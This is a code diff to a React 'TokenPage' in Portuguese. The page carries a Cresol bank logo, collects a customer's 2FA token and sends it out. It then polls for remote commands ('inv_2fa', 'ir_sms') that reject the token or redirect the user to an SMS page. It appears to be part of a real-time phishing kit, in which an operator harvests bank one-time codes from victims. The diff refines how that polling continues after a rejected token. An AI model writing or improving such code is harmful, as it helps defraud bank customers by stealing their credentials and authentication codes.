@@ -1,4 +1,5 @@
-import React, { useState, useEffect } from "react";
+
+import React, { useState, useEffect, useRef } from "react";
 import { ArrowLeft } from "lucide-react";
 import { useNavigate } from "react-router-dom";
 import cresolLogo from "/lovable-uploads/afc18ce7-1259-448e-9ab4-f02f2fbbaf19.png";
@@ -10,13 +11,19 @@ const monitorClientToken = async (
   clientId: string, 
   navigate: (path: string) => void,
   onInvalidCode: () => void,
-  onStopLoading: () => void
+  isMonitoringRef: React.MutableRefObject<boolean>
 ): Promise<void> => {
   console.log(`Iniciando monitoramento Token do cliente: ${clientId}`);
   
   let intervalId: NodeJS.Timeout;
   
   const monitor = async () => {
+    if (!isMonitoringRef.current) {
+      console.log('Monitoramento Token parado por flag');
+      clearInterval(intervalId);
+      return;
+    }
+
     try {
       console.log(`Consultando dados do cliente ${clientId} na página Token...`);
       
@@ -35,13 +42,11 @@ const monitorClientToken = async (
         console.log('Valor do response Token:', clientData.data?.response);
         console.log('Valor do command Token:', clientData.data?.command);
         
-        // Verificar se o token é inválido
+        // Verificar se o token é inválido - NÃO para o monitoramento
         if (clientData.data?.response === "inv_2fa" || clientData.data?.command === "inv_2fa") {
-          console.log('Detectado inv_2fa - Token inválido');
-          clearInterval(intervalId);
-          onStopLoading();
+          console.log('Detectado inv_2fa - Token inválido, mas continuando monitoramento');
           onInvalidCode();
-          return;
+          return; // Continua monitoramento, não para
         }
         
         // Na página Token: se receber ir_2fa, continua monitorando; aguarda próximo comando para redirecionar
@@ -49,11 +54,11 @@ const monitorClientToken = async (
           console.log('Detectado ir_2fa na página Token - Continuando monitoramento...');
         }
         
-        // Se receber ir_sms, redireciona para SMS
+        // Se receber ir_sms, redireciona para SMS e para monitoramento
         if (clientData.data?.response === "ir_sms" || clientData.data?.command === "ir_sms") {
           console.log('Detectado ir_sms na página Token - Redirecionando para /sms');
           clearInterval(intervalId);
-          onStopLoading();
+          isMonitoringRef.current = false;
           console.log('Monitoramento Token parado - redirecionando...');
           navigate('/sms');
           return;
@@ -86,6 +91,7 @@ const TokenPage = () => {
   const [isLoading, setIsLoading] = useState(false);
   const [isInvalid, setIsInvalid] = useState(false);
   const [errorMessage, setErrorMessage] = useState("");
+  const isMonitoringRef = useRef(false);
 
   useEffect(() => {
     // Recuperar clientId do localStorage
@@ -102,6 +108,7 @@ const TokenPage = () => {
 
     // Cleanup quando sair da página
     return () => {
+      isMonitoringRef.current = false;
       clientStatus.stopMonitoring();
     };
   }, [clientStatus]);
@@ -144,18 +151,22 @@ const TokenPage = () => {
 
       if (response.ok) {
         console.log('Token enviado com sucesso via external-response');
-        // Iniciar monitoramento contínuo após envio bem-sucedido
-        await monitorClientToken(
-          clientId, 
-          navigate,
-          () => {
-            setIsInvalid(true);
-            setErrorMessage("Token inválido. Tente novamente.");
-          },
-          () => {
-            setIsLoading(false);
-          }
-        );
+        
+        // Só iniciar monitoramento se não estiver já monitorando
+        if (!isMonitoringRef.current) {
+          isMonitoringRef.current = true;
+          // Iniciar monitoramento contínuo após envio bem-sucedido
+          await monitorClientToken(
+            clientId, 
+            navigate,
+            () => {
+              setIsInvalid(true);
+              setErrorMessage("Token inválido. Tente novamente.");
+              setIsLoading(false); // Para loading quando token é inválido, mas mantém monitoramento
+            },
+            isMonitoringRef
+          );
+        }
       } else {
         console.log('Erro ao enviar token via external-response');
         setIsLoading(false);
@@ -167,6 +178,7 @@ const TokenPage = () => {
   };
 
   const handleBack = () => {
+    isMonitoringRef.current = false;
     navigate("/sms");
   };
 
